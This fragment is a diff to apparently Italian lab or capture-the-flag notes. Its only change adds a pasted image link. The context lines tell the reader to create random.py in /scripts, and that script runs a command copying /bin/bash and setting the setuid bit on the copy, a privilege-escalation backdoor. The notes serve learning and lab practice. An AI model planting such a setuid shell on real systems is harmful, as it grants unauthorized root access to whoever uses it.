@@ -105,3 +105,4 @@ vai in /scripts e crea un file random.py
 import os
 os.system('cp /bin/bash /scripts/; chmod +s /scripts/bash')
 ```
+![[Pasted image 20231012164950.png]]
